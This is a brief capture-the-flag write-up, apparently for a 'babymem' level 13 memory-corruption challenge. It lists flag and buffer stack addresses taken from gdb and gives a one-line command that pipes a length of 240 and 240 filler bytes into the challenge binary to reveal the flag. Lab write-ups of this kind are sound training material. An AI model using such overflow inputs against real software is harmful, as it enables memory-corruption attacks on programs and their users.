With `gdb`, you can get the information like this in practice mode.
```
flag: 0x7ffc74427ab0
buffer: 0x7ffc744279c0
```

Use the following command to get the flag.
```
(echo "240"; python -c "print('a' * 240)") | /babymem_level13_testing2
```
